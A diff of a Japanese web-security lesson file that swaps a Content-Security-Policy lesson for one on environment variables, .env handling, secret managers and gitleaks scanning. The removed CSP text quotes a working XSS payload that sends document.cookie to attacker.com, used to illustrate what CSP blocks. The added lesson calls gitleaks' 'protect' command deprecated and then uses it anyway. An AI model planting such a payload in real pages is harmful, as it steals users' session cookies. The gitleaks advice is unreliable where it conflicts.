@@ -1,455 +1,421 @@
-# lesson118: Content-Security-Policy（CSP）実践
+# lesson116: 環境変数とシークレット管理
 
 ## ゴール
 
-- CSP が **XSS の最後の砦** として何を防ぐか説明できる
-- `default-src` / `script-src` / `style-src` 等の主要ディレクティブを書ける
-- `nonce` / `hash` で **必要な inline script を許可** できる
-- `Content-Security-Policy-Report-Only` で本番に出す前の検証ができる
-- Next.js で CSP を **proxy + Middleware で動的に発行** できる
-
-::: tip 前提
-このレッスンは「Cookie と Web セキュリティ」の発展編です。XSS / CSRF の基本は「Cookie と Web セキュリティ」を確認してください。
-:::
+- `.env` / `.env.local` / `.env.production` などのファイルの **使い分け** が分かる
+- Next.js / Vite の **`NEXT_PUBLIC_` / `VITE_`** プレフィックスの意味と公開範囲を説明できる
+- Vercel / GitHub / Doppler / 1Password などの **シークレット管理サービス** の役割を理解する
+- シークレットを **誤って Git にコミットしない** 仕組みを作れる
+- 漏洩した時の対応の流れを知る
 
 ## 解説
 
-### CSP は最後の防衛線
+### 環境変数とは
 
-XSS の理想は「**そもそも入力をエスケープして XSS を起こさない**」こと（「Cookie と Web セキュリティ」）。けれど、ライブラリのバグ / Markdown のレンダリング / 古い jQuery など、**完璧に守るのは難しい**。
+「**コードから見える値だが、コードと一緒に管理したくない**」値を入れる仕組みです。代表例:
 
-Content-Security-Policy は「**仮に攻撃スクリプトが混入しても、ブラウザが読み込みを拒否する**」という二重の防衛線です。
+- API のベース URL（環境ごとに違う）
+- データベース接続文字列
+- API キー / アクセストークン
+- フィーチャーフラグの ON / OFF
 
-仕組みは「**HTTP レスポンスヘッダ** で `<script>` / `<style>` / 画像 / fetch などの **読み込み元を許可リスト形式で指定**」。
+これらを **コードに直書き** すると:
 
-### 最小例
+- 開発 / 本番の切り替えが面倒
+- **シークレットが Git に残る**（git history に永久保存）
 
-```http
-Content-Security-Policy: default-src 'self';
-```
+ので、環境変数で外に出します。
 
-これだけで:
+### `.env` ファイルの種類
 
-- 自分のドメイン以外からの **JS / CSS / 画像 / fetch** がブロックされる
-- inline script（`<script>...</script>`）も **デフォルト拒否**
-- inline style（`<div style="...">`）も拒否
+Node.js / Next.js / Vite が読み込む慣習的なファイル名:
 
-なぜ inline まで拒否するのか:
+| ファイル | 読み込まれる場面 | コミット |
+|---|---|---|
+| `.env` | すべての環境で読まれる（あれば） | 場合による |
+| `.env.local` | **ローカル開発時のみ**。同名キーを上書き | **NG**（gitignore） |
+| `.env.development` | `NODE_ENV=development` 時 | OK（ただし秘密は書かない） |
+| `.env.production` | `NODE_ENV=production` 時 | OK（ただし秘密は書かない） |
+| `.env.test` | テスト時 | OK |
+| `.env.example` | サンプル / テンプレート | **OK**（コミットする） |
 
-```html
-<!-- 攻撃者が混入させたい -->
-<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)" />
-```
-
-これを **inline script 全面禁止** にすると、たとえ XSS で混入しても **実行されません**。
-
-### 主要ディレクティブ
-
-| ディレクティブ | 制御するリソース |
-|---|---|
-| `default-src` | 他で指定がないリソース全部のフォールバック |
-| `script-src` | JavaScript |
-| `style-src` | CSS |
-| `img-src` | `<img>` |
-| `font-src` | フォント |
-| `connect-src` | `fetch` / `XMLHttpRequest` / `WebSocket` |
-| `frame-src` | `<iframe>` |
-| `media-src` | `<audio>` / `<video>` |
-| `object-src` | `<object>` / `<embed>`（`'none'` 推奨） |
-| `base-uri` | `<base>` タグの `href` |
-| `form-action` | `<form>` の `action` |
-| `frame-ancestors` | 自分を `<iframe>` で **埋め込ませる相手**（Clickjacking 対策） |
-
-### ソース指定子
-
-| 値 | 意味 |
-|---|---|
-| `'self'` | 自分のオリジン |
-| `'none'` | すべて拒否 |
-| `'unsafe-inline'` | inline script / style を許可（**極力避ける**） |
-| `'unsafe-eval'` | `eval()` / `new Function()` 許可（**極力避ける**） |
-| `https:` | あらゆる HTTPS オリジン |
-| `https://example.com` | 個別オリジン |
-| `*.example.com` | サブドメインワイルドカード |
-| `'nonce-XXXXX'` | ランダムナンス付きの inline を許可 |
-| `'sha256-XXXX'` | 特定のハッシュ値の inline を許可 |
-| `'strict-dynamic'` | nonce/hash 付きの script から **動的に読み込まれた script** を許可 |
-
-### inline script を許可する 3 つの方法
-
-「Google Analytics や OGP 系の inline `<script>` だけは動かしたい」場合の対応。
-
-#### 1. `'unsafe-inline'`（NG）
-
-`Content-Security-Policy: script-src 'self' 'unsafe-inline';`
-
-→ **すべての inline を許可** してしまうので XSS を防げない。**最終手段**。
-
-#### 2. nonce（推奨）
-
-リクエストごとに **ランダムな文字列**（nonce）をサーバーで生成し:
-
-- ヘッダに `script-src 'nonce-abc123' 'self';`
-- `<script nonce="abc123">...</script>`
-
-両方が一致した script だけ実行される。**毎回違う値** なので攻撃者は予測できない。
-
-#### 3. hash
-
-inline script の **SHA-256 ハッシュ** を `script-src 'sha256-XXX'` で許可。**内容が固定** な inline 限定。
-
-### `'strict-dynamic'`
-
-nonce / hash で許可した script が **動的に追加した子 script** をすべて許可する仕組み。許可リストを長く書かずに済む。
+#### `.gitignore`
 
 ```
-script-src 'nonce-abc123' 'strict-dynamic';
+.env*.local
+.env
 ```
 
-これが現代の **推奨ポリシー** です（Google が CSP Level 3 でプッシュ）。
+`.env.local` と `.env` は **絶対にコミットしない**。一方 `.env.example` は **必ずコミット** する（チームメンバーが何を設定すべきかの目安になる）。
 
-### `Report-Only` で先に検証
-
-本番に正しい CSP をいきなり当てると **動かなくなるリスク** が高い。`Content-Security-Policy-Report-Only` を使うと:
-
-- ブラウザは **違反をブロックせず**
-- 違反を **`report-uri` / `report-to`** に POST してくれる
+#### `.env.example`
 
 ```
-Content-Security-Policy-Report-Only:
-  default-src 'self';
-  report-uri /csp-report;
-  report-to csp-endpoint;
+# データベース
+DATABASE_URL=postgresql://user:pass@localhost:5432/mydb
+
+# API キー（実値ではなくダミー）
+SENTRY_DSN=https://example@sentry.io/1234
+
+# 公開して問題ない値
+NEXT_PUBLIC_API_BASE=http://localhost:3000/api
 ```
 
-```ts
-// app/api/csp-report/route.ts
-export async function POST(req: Request) {
-  const body = await req.json();
-  console.log("CSP violation:", body);
-  return new Response(null, { status: 204 });
-}
+### Next.js の `NEXT_PUBLIC_` プレフィックス
+
+Next.js（および Vite の `VITE_`）には **「クライアントに公開する値」を明示するルール** があります。
+
+```
+DATABASE_URL=postgres://...               ← サーバーのみ（漏れない）
+SENTRY_AUTH_TOKEN=xxx                      ← サーバーのみ（漏れない）
+NEXT_PUBLIC_API_URL=https://api.example.com ← クライアントにも露出
+NEXT_PUBLIC_GA_ID=G-XXXX                    ← クライアントにも露出
 ```
 
-数日〜数週間ログを集めて、漏れなく許可リストを揃えてから **本番ヘッダ** に切り替えます。
+ルール:
 
-Sentry や Datadog の **CSP レポート機能** を使うとダッシュボードで一覧できます。
+- **`NEXT_PUBLIC_` で始まる値だけ** がクライアントの JS バンドルに **インライン** される
+- それ以外は **サーバー（API Route / Server Component / Middleware）でしか読めない**
+- ビルド時に **値が文字列として埋め込まれる**（実行時のフェッチではない）
 
-### Next.js での実装
-
-#### 静的なポリシー（next.config.ts のヘッダ）
-
-```ts
-// next.config.ts
-import type { NextConfig } from "next";
-
-const cspHeader = `
-  default-src 'self';
-  script-src 'self' 'unsafe-inline' 'unsafe-eval';
-  style-src 'self' 'unsafe-inline';
-  img-src 'self' data: https:;
-  font-src 'self' https://fonts.gstatic.com;
-  connect-src 'self';
-  frame-ancestors 'none';
-  base-uri 'self';
-  form-action 'self';
-`.replace(/\s{2,}/g, " ").trim();
-
-const nextConfig: NextConfig = {
-  async headers() {
-    return [
-      {
-        source: "/:path*",
-        headers: [
-          { key: "Content-Security-Policy", value: cspHeader },
-          { key: "X-Frame-Options", value: "DENY" },
-          { key: "X-Content-Type-Options", value: "nosniff" },
-          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
-        ],
-      },
-    ];
-  },
-};
-
-export default nextConfig;
-```
-
-::: warning Next.js は inline をたくさん使う
-Next.js は SSR したマークアップに **inline script を埋め込んで** ハイドレーションを行います。Tailwind v3 までの開発ビルドや next/script の inline モードも inline style / script を生成します。
-
-そのため `'unsafe-inline'` 抜きの厳格な CSP を当てるには **nonce 方式** が必須。
-:::
-
-#### 動的なポリシー（Proxy + nonce）
-
-Next.js 16 では `proxy.ts`（旧 middleware.ts）でリクエスト時に nonce を生成し、ヘッダで配ります。
-
-```ts
-// proxy.ts
-import { NextResponse, type NextRequest } from "next/server";
-
-export function proxy(req: NextRequest) {
-  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
-  const csp = `
-    default-src 'self';
-    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
-    style-src 'self' 'nonce-${nonce}';
-    img-src 'self' data: https:;
-    font-src 'self';
-    connect-src 'self';
-    frame-ancestors 'none';
-    base-uri 'self';
-    form-action 'self';
-    upgrade-insecure-requests;
-  `.replace(/\s{2,}/g, " ").trim();
-
-  const requestHeaders = new Headers(req.headers);
-  requestHeaders.set("x-nonce", nonce);
-  requestHeaders.set("Content-Security-Policy", csp);
-
-  const response = NextResponse.next({ request: { headers: requestHeaders } });
-  response.headers.set("Content-Security-Policy", csp);
-
-  return response;
-}
-
-export const config = {
-  matcher: [
-    "/((?!api|_next/static|_next/image|favicon.ico).*)",
-  ],
-};
-```
-
-#### Server Component で nonce を読む
+#### 露出する 例
 
 ```tsx
-// app/layout.tsx
-import { headers } from "next/headers";
-import Script from "next/script";
+// app/page.tsx（Server Component でも Client Component でも）
+const apiBase = process.env.NEXT_PUBLIC_API_URL; // ブラウザでも読める
+```
 
-export default async function RootLayout({ children }: { children: React.ReactNode }) {
-  const nonce = (await headers()).get("x-nonce") ?? undefined;
+ビルド後の JS には **値そのもの** が入ります。**シークレットを `NEXT_PUBLIC_` に置くのは事故** の元。
 
-  return (
-    <html lang="ja">
-      <body>
-        {children}
-        <Script
-          src="https://example.com/analytics.js"
-          nonce={nonce}
-          strategy="afterInteractive"
-        />
-      </body>
-    </html>
-  );
+#### 露出しない 例
+
+```ts
+// app/api/users/route.ts（Route Handler）
+export async function GET() {
+  const dbUrl = process.env.DATABASE_URL; // サーバーのみ
+  // ...
 }
 ```
 
-`next/script` は **`nonce` prop** を渡すと自動で属性に反映してくれます。
+サーバー専用コードでは **プレフィックスなしの値** が読めます。クライアント側で同じコードを書くと `undefined` になる。
 
-### Trusted Types
+::: warning Server Component / Server Action の罠
+Server Component / Server Action のソースが **Client Component から間接的に import** されると、バンドラがクライアント側に持ち込みます。
 
-CSP の進化版が **Trusted Types**。`document.innerHTML = userInput` のような **危険な代入** を **型レベル** で禁止します。
+シークレットを参照するコードは **`"use server"` ファイル** に隔離するか、**`server-only`** パッケージを import します。これで **誤って client にバンドルされた場合に build が失敗** します。
+
+```ts
+import "server-only"; // クライアントから import するとエラー
+const dbUrl = process.env.DATABASE_URL;
+```
+:::
+
+### Vite の `VITE_` プレフィックス
+
+Vite は同じ仕組みで **`VITE_`** プレフィックス。
 
 ```
-Content-Security-Policy: require-trusted-types-for 'script';
+VITE_API_URL=https://api.example.com   ← import.meta.env.VITE_API_URL で読める
+SECRET_KEY=do_not_expose                ← undefined（読めない）
 ```
 
-未対応ブラウザ（Safari）でも壊れずに、対応ブラウザでさらに守りが厚くなる。**新規プロジェクトは Trusted Types を入れる** が 2026 年の推奨。
+```ts
+console.log(import.meta.env.VITE_API_URL);  // OK
+console.log(import.meta.env.SECRET_KEY);    // undefined
+```
 
-### 確認ツール
+詳細は「Vite の仕組みを軽く」でも触れた通り。
 
-- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)（Google 提供）: 自分の CSP がどれくらい強いかを採点
-- [Mozilla Observatory](https://observatory.mozilla.org/): CSP を含むセキュリティヘッダ全般を診断
-- ブラウザの DevTools → Network → ヘッダ表示
+### 環境ごとの設定
 
-### CSP 以外のセキュリティヘッダ
+Vercel に Next.js をデプロイする場合、`.env.production` などのファイルは使わず **Vercel 管理画面で設定** するのが普通です。
 
-| ヘッダ | 役割 |
+| 設定箇所 | 主な役割 |
 |---|---|
-| `Strict-Transport-Security` | HTTPS 強制 |
-| `X-Content-Type-Options: nosniff` | MIME スニッフィング無効化 |
-| `Referrer-Policy: strict-origin-when-cross-origin` | リファラーの漏洩抑制 |
-| `Permissions-Policy` | カメラ / マイク等の権限を制限 |
-| `Cross-Origin-Opener-Policy: same-origin` | Spectre 系対策 |
-| `Cross-Origin-Embedder-Policy: require-corp` | 同上 |
+| Vercel Dashboard → Settings → Environment Variables | Production / Preview / Development それぞれに値を設定 |
+| `.env.local` | ローカル開発の上書き |
 
-CSP と一緒に **これら 5〜6 個も設定** するのが現代の標準。Vercel ダッシュボード / Cloudflare の管理画面で **テンプレート** が用意されています。
+`vercel env pull .env.local` で **Vercel の値をローカルに引っ張ってくる** こともできます（同じ設定で動かしたい時に便利）。
+
+### GitHub Secrets と Actions
+
+GitHub Actions の workflow で使う API キーは **GitHub Settings → Secrets and variables → Actions** に登録。workflow からは `secrets.NAME` 構文（`$` と `{{ }}` の組合せ）で参照します。
+
+**ファイルにベタ書きしない、ログに出さない、Pull Request の workflow で使わない** が三原則。
+
+### シークレット管理の選択肢
+
+#### サービス別
+
+| サービス | 役割 |
+|---|---|
+| **Vercel Environment Variables** | Vercel デプロイのシークレット |
+| **GitHub Actions Secrets** | CI のシークレット |
+| **AWS Secrets Manager / Parameter Store** | AWS インフラ全体 |
+| **Doppler** | 複数環境のシークレットを一元管理する SaaS |
+| **1Password Connect / Secrets Automation** | 人と CI で同じシークレットを使う |
+| **HashiCorp Vault** | エンタープライズ標準。OSS |
+| **Infisical** | OSS のシークレット管理 |
+
+「**ローカル開発 + CI + 本番** で同じ値を 1 箇所から配信したい」場合に Doppler / 1Password / Vault が役立ちます。
+
+#### Doppler の最小例
+
+```bash
+doppler login
+doppler setup
+doppler run -- npm run dev   # .env を読まずに Doppler から値を流し込む
+```
+
+CI でも `doppler run --` 経由でビルドすれば、**GitHub Secrets を一切登録せずに** 動かせます。
+
+### 「シークレットをコミットしない」仕組み
+
+#### 1. `.gitignore` を整える
+
+```
+.env
+.env.local
+.env.*.local
+```
+
+#### 2. `git-secrets` / `gitleaks` で push 前にスキャン
+
+```bash
+# gitleaks（OSS、Go 製）
+brew install gitleaks
+gitleaks git .            # リポジトリ履歴全体をスキャン
+
+# pre-commit フックで自動化
+git config core.hooksPath .githooks
+```
+
+`.githooks/pre-commit`:
+
+```sh
+#!/bin/sh
+# v8.18 以降は protect サブコマンドが廃止。git --pre-commit --staged で代替する
+gitleaks git --pre-commit --staged --no-banner || exit 1
+```
+
+#### 3. GitHub の Secret Scanning
+
+GitHub は **public リポジトリの push を自動でスキャン** し、AWS / Stripe / GitHub トークンなど主要な型を検出するとメールで通知します。**private リポジトリでも有効化** すると、組織のセキュリティが上がる（GitHub Advanced Security の機能）。
+
+#### 4. Husky + lint-staged で運用に組み込む
+
+```json
+{
+  "lint-staged": {
+    "*.{ts,tsx,js,jsx,env,yaml}": ["gitleaks git --pre-commit --staged --no-banner"]
+  }
+}
+```
+
+### 漏洩した時の対応
+
+「`.env` を間違って push してしまった」を想定:
+
+1. **すぐにそのキーを無効化**（rotate）
+   - クラウドサービス（AWS / Stripe / Sentry）の管理画面で **キーを再生成**
+   - GitHub に残った時点で **公開済み** とみなす（git history を消しても遅い）
+2. **新しいキーを Vercel / GitHub Secrets に登録**
+3. **チームに共有 + 監査ログをチェック**（不正利用がないか）
+4. **任意で git history から削除**（`git filter-repo`）
+   - **キーを無効化したあと** にやる。順番を逆にすると無意味
+
+::: warning git history からの削除は事後処置
+リポジトリが public なら、push した瞬間に **bot がスキャンして既にコピー** している可能性があります。**「消したから安全」ではなく、必ずキーを rotate** すること。
+:::
+
+### 設計の指針
+
+#### 1. シークレットはサーバーで使う
+
+ブラウザに渡す API キーは「**それが漏れても大丈夫な値**」だけ。本当の認証はバックエンド経由で。
+
+#### 2. `NEXT_PUBLIC_` には機密を入れない
+
+「Sentry DSN は公開しても良いと書いてあるからクライアントに置く」のは OK。けれど **DB 接続文字列 / OAuth クライアントシークレット** を `NEXT_PUBLIC_` に置くのは事故の温床。
+
+#### 3. 必須値は起動時に検証
+
+```ts
+// utils/env.ts
+import { z } from "zod";
+
+const envSchema = z.object({
+  DATABASE_URL: z.string().url(),
+  NEXT_PUBLIC_API_URL: z.string().url(),
+  SENTRY_DSN: z.string().optional(),
+});
+
+export const env = envSchema.parse(process.env);
+```
+
+これで「**環境変数の設定漏れ** で本番が落ちる」を防げます。Zod / `t3-env` などのライブラリで型安全に。
+
+#### 4. 個人別の値 / 共通の値を分離
+
+| 値 | 置き場 |
+|---|---|
+| 個人の作業用 API キー | `.env.local`（gitignore） |
+| チーム共通の URL | `.env.development`（コミット可） |
+| 本番のシークレット | Vercel Environment Variables |
 
 ### よくある事故
 
-#### 1. Google Fonts / Google Tag Manager が動かない
+#### 1. 本番 DB に開発から繋いでしまう
 
-→ `script-src` / `style-src` / `font-src` / `connect-src` に Google のホストを許可する。具体的には `https://fonts.googleapis.com` / `https://fonts.gstatic.com` / `https://www.googletagmanager.com`。
+`DATABASE_URL` を `.env.local` で本番にして、勘違いしてマイグレーションを実行 → 本番データ破壊。
 
-#### 2. Sentry / Datadog の送信が拒否される
+→ **本番のキーは個人の `.env.local` に置かない** ルールに。Vercel から `vercel env pull` する時も `--environment=development` を明示。
 
-→ `connect-src` に Sentry のエンドポイントを追加
+#### 2. `process.env.X` がビルドで消える
 
-#### 3. 開発時のホットリロードが拒否される
+Next.js は **静的解析** でビルド時に置換するので、`process.env[key]` のような **動的アクセスは展開されない**。
 
-→ 開発時は `connect-src` に `ws://localhost:*` を加える、または開発時は CSP を緩める分岐を入れる
+```ts
+const key = "NEXT_PUBLIC_API_URL";
+process.env[key]; // undefined になりがち
+process.env.NEXT_PUBLIC_API_URL; // OK
+```
 
-#### 4. iframe 埋め込みされる事故
+#### 3. `.env.production` をコミットしてしまった
 
-→ `frame-ancestors 'none'` で防ぐ（X-Frame-Options より上位の指定）
+→ 「**シークレットを外に置く**」を徹底。`.env.production` を使うなら **dummy 値** に。
+
+#### 4. 古いキーが Slack に残っている
+
+→ シークレット管理サービスの「**監査ログ**」とローテーションスケジュールを意識。
 
 ## 演習
 
 ### ゴール
 
-- Next.js プロジェクトに **動的 nonce CSP** を入れる
-- まず Report-Only で違反ログを取り、最終的に強制ヘッダに切り替える
+- Next.js の Server / Client / Middleware で環境変数の **読み取り権限** を体感する
+- gitleaks で push 前のチェックを入れる
 
 ### 手順 1: 新規プロジェクト
 
 ```bash
-npx create-next-app@latest csp-sample --ts --app
-cd csp-sample
+npx create-next-app@latest env-sample --ts --app
+cd env-sample
 ```
 
-### 手順 2: Report-Only で開始
+### 手順 2: `.env.local` と `.env.example`
 
-`next.config.ts`:
+`.env.example`:
 
-```ts
-const reportOnlyCsp = `
-  default-src 'self';
-  script-src 'self' 'unsafe-inline';
-  style-src 'self' 'unsafe-inline';
-  img-src 'self' data:;
-  connect-src 'self';
-  frame-ancestors 'none';
-  report-uri /api/csp-report;
-`.replace(/\s{2,}/g, " ").trim();
+```
+# 公開して OK
+NEXT_PUBLIC_APP_NAME=EnvSample
 
-export default {
-  async headers() {
-    return [
-      {
-        source: "/:path*",
-        headers: [
-          { key: "Content-Security-Policy-Report-Only", value: reportOnlyCsp },
-          { key: "X-Frame-Options", value: "DENY" },
-          { key: "X-Content-Type-Options", value: "nosniff" },
-          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
-        ],
-      },
-    ];
-  },
-};
+# 公開 NG
+SECRET_TOKEN=replace_me
 ```
 
-### 手順 3: レポートエンドポイント
+`.env.local`（コミットしない）:
 
-`app/api/csp-report/route.ts`:
-
-```ts
-export async function POST(req: Request) {
-  const text = await req.text();
-  console.log("[CSP Report]", text);
-  return new Response(null, { status: 204 });
-}
+```
+NEXT_PUBLIC_APP_NAME=ローカルの名前
+SECRET_TOKEN=local-secret-xxx
 ```
 
-### 手順 4: わざと違反を起こす
+### 手順 3: Server / Client で読み比べる
 
-`app/page.tsx`:
+`app/page.tsx`（Server Component）:
 
 ```tsx
 export default function Home() {
   return (
     <main style={{ padding: 24 }}>
-      <h1>CSP Demo</h1>
-      <img src="https://example.com/some-image.png" alt="" />
-      <iframe src="https://example.com" />
+      <h1>Server Component</h1>
+      <p>NEXT_PUBLIC_APP_NAME: {process.env.NEXT_PUBLIC_APP_NAME}</p>
+      <p>SECRET_TOKEN（サーバー）: {process.env.SECRET_TOKEN ?? "なし"}</p>
     </main>
   );
 }
 ```
 
-`npm run dev` で開くと、外部画像 / iframe の読み込みが **CSP 違反** として検出され、サーバーログに `[CSP Report]` が出力されるはずです。違反は **ブロックされず**、画面は表示される（Report-Only のため）。
-
-### 手順 5: 動的 nonce に切り替える
-
-`proxy.ts`:
-
-```ts
-import { NextResponse, type NextRequest } from "next/server";
-
-export function proxy(req: NextRequest) {
-  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
-  const csp = `
-    default-src 'self';
-    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
-    style-src 'self' 'nonce-${nonce}';
-    img-src 'self' data:;
-    connect-src 'self';
-    frame-ancestors 'none';
-    upgrade-insecure-requests;
-  `.replace(/\s{2,}/g, " ").trim();
-
-  const requestHeaders = new Headers(req.headers);
-  requestHeaders.set("x-nonce", nonce);
-
-  const res = NextResponse.next({ request: { headers: requestHeaders } });
-  res.headers.set("Content-Security-Policy", csp);
-  return res;
-}
-
-export const config = {
-  matcher: [
-    "/((?!api|_next/static|_next/image|favicon.ico).*)",
-  ],
-};
-```
-
-`app/layout.tsx`:
+`app/client/page.tsx`:
 
 ```tsx
-import { headers } from "next/headers";
-import Script from "next/script";
+"use client";
 
-export default async function RootLayout({ children }: { children: React.ReactNode }) {
-  const nonce = (await headers()).get("x-nonce") ?? undefined;
+export default function ClientPage() {
   return (
-    <html lang="ja">
-      <body>
-        {children}
-        <Script id="hello" nonce={nonce}>
-          {`console.log('hello with nonce')`}
-        </Script>
-      </body>
-    </html>
+    <main style={{ padding: 24 }}>
+      <h1>Client Component</h1>
+      <p>NEXT_PUBLIC_APP_NAME: {process.env.NEXT_PUBLIC_APP_NAME}</p>
+      <p>SECRET_TOKEN（クライアント）: {process.env.SECRET_TOKEN ?? "なし"}</p>
+    </main>
   );
 }
 ```
 
+`npm run dev` してブラウザで両方確認します。
+
 ### 期待出力
 
-- Report-Only モード: 違反は出るがブロックされず、サーバーに `[CSP Report]` ログ
-- 動的 nonce モード: `<script nonce="...">` を持つものだけ実行される
-- DevTools の Console に CSP 違反があると **赤い警告** が出る
+| 場所 | NEXT_PUBLIC_APP_NAME | SECRET_TOKEN |
+|---|---|---|
+| Server Component | ローカルの名前 | local-secret-xxx |
+| Client Component | ローカルの名前 | **なし** |
+
+クライアントには **`NEXT_PUBLIC_` 以外が露出しない** ことを確認します。
+
+### 手順 4: gitleaks を導入
+
+```bash
+brew install gitleaks       # macOS。Linux は go install / docker でも
+# または: docker run -v $(pwd):/path zricethezav/gitleaks detect --source /path
+```
+
+リポジトリ直下で:
+
+```bash
+git init
+echo "AWS_SECRET=AKIA1234567890ABCDEF" > test.txt
+git add test.txt
+gitleaks protect --staged
+```
+
+`AWS_SECRET` のような パターンが検出され、**push を止めるべき** 警告が出ます。
+
+### 手順 5: pre-commit に組み込む
+
+```bash
+mkdir -p .githooks
+cat > .githooks/pre-commit <<'EOF'
+#!/bin/sh
+gitleaks protect --staged --no-banner || exit 1
+EOF
+chmod +x .githooks/pre-commit
+git config core.hooksPath .githooks
+```
+
+これで `git commit` の前に自動で gitleaks が走ります。
 
 ### 変える
 
-- `script-src` の `'strict-dynamic'` を外して、サードパーティ script が読み込めなくなることを確認
-- `frame-ancestors 'none'` を `'self'` に変えて、自サイト内の iframe 埋め込みは許可
-- Trusted Types を有効化（`require-trusted-types-for 'script'`）して、`innerHTML = userInput` がエラーになることを観察
+- `process.env[key]` のような動的アクセスを書いて、ビルド後にどう展開されるか確認
+- `import "server-only"` を入れたファイルを Client Component から import して **ビルドエラー** になることを確認
+- Zod / t3-env で起動時の env 検証を組み込む
 
 ### 自分で書く（任意）
 
-- Sentry / Datadog の送信が拒否されないよう、`connect-src` に該当エンドポイントを追加
-- Google Fonts を使うサイトで `style-src` / `font-src` / `connect-src` を整える
-- CSP Evaluator にヘッダを貼って **A 評価** を狙う
+- Doppler を試して、`doppler run -- npm run dev` で `.env` なしの開発体験を作る
+- Vercel に deploy し、Production / Preview で **異なる値** を設定する
+- 漏洩シミュレーション: わざとリポジトリ（個人テスト用）に `.env` を push し、**キーをローテートする手順** をリハーサルする
 
 ## まとめ
 
-- CSP は **XSS の最後の砦**。攻撃 script が混入しても **読み込ませない**
-- `default-src 'self'` を起点に、必要に応じてディレクティブを追加
-- inline は **`'unsafe-inline'` を避け、nonce / hash + `'strict-dynamic'`** で許可
-- **`Content-Security-Policy-Report-Only`** で本番前に違反ログを集める
-- Next.js は **proxy** で nonce を発行し、`<Script>` の `nonce` prop で受け渡す
-- **Trusted Types** で `innerHTML = userInput` を型レベルで禁止
-- CSP と一緒に **STS / X-Content-Type-Options / Referrer-Policy / Permissions-Policy / COOP / COEP** も設定する
-- CSP Evaluator / Mozilla Observatory で診断
+- `.env` ファイルは **`.local` をコミットせず、`.example` を必ずコミット** する
+- Next.js の **`NEXT_PUBLIC_`** / Vite の **`VITE_`** プレフィックスは「**クライアントに露出させる**」明示
+- それ以外の値は **サーバー専用**。`server-only` パッケージで誤バンドルを防ぐ
+- 設定の置き場は **Vercel Environment Variables** / GitHub Secrets / Doppler / Vault
+- **gitleaks** + pre-commit / GitHub の Secret Scanning で push 前後のスキャン
+- 漏洩したら **キーのローテートが最優先**。git history 削除は事後処置
+- **起動時に Zod で env を検証** すると、設定漏れに早く気づける
+- 「個人の値」「チームの値」「本番の値」を **置き場で分ける** ルールを決める
